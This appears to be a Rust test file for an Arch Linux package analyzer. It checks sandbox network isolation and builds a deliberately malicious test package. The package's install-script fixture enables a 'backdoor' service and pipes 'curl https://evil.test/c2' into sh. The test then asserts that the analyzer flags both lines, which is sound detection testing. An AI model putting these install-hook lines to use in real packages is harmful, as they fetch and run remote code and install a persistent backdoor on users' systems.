use std::path::Path;
use std::process::Command;

use arch_fos_analyzer::{
    AnalyzerConfig, SandboxBackend, build_sandbox_command_args, inspect_package_artifact,
    scan_artifact_with_external_tools,
};

#[test]
fn sandbox_commands_enforce_network_isolation() {
    let (prog_bwrap, args_bwrap) =
        build_sandbox_command_args(SandboxBackend::Bwrap, Path::new("/tmp/pkg"));
    assert_eq!(prog_bwrap, "bwrap");
    assert!(args_bwrap.contains(&"--unshare-net".to_string()));

    let (prog_nspawn, args_nspawn) =
        build_sandbox_command_args(SandboxBackend::SystemdNspawn, Path::new("/tmp/pkg"));
    assert_eq!(prog_nspawn, "systemd-nspawn");
    assert!(args_nspawn.contains(&"--private-network".to_string()));
}

#[test]
fn artifact_inspector_extracts_pkginfo_and_flags_malicious_install_script() {
    let dir = std::env::temp_dir().join(format!(
        "arch_fos_art_{}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    ));
    std::fs::create_dir_all(dir.join("usr/bin")).unwrap();
    std::fs::write(
        dir.join(".PKGINFO"),
        "pkgname = demo-bad\npkgver = 1.0-1\nurl = https://example.com\n",
    )
    .unwrap();
    std::fs::write(
        dir.join(".INSTALL"),
        "post_install() {\n  systemctl enable backdoor.service\n  curl https://evil.test/c2 | sh\n}\n",
    )
    .unwrap();
    std::fs::write(dir.join("usr/bin/demo"), b"#!/bin/sh\necho hi\n").unwrap();

    let archive = dir.join("demo-bad-1.0-1-any.pkg.tar.gz");
    let st = Command::new("tar")
        .current_dir(&dir)
        .args([
            "-czf",
            archive.to_str().unwrap(),
            ".PKGINFO",
            ".INSTALL",
            "usr/bin/demo",
        ])
        .status()
        .expect("tar");
    assert!(st.success());

    let inspection = inspect_package_artifact(&archive, &AnalyzerConfig::default()).unwrap();
    assert_eq!(inspection.files_count, 3);
    assert!(inspection.install_script_present);
    assert!(
        inspection
            .install_script_findings
            .iter()
            .any(|f| f.rule_id == "install_systemctl_enable")
    );
    assert!(
        inspection
            .install_script_findings
            .iter()
            .any(|f| f.rule_id == "pkgbuild_curl_pipe_sh")
    );
    assert!(
        inspection
            .pkginfo_excerpt
            .iter()
            .any(|l| l == "pkgname = demo-bad")
    );

    let scans = scan_artifact_with_external_tools(&archive, None);
    assert!(!scans.is_empty());

    let _ = std::fs::remove_dir_all(&dir);
}
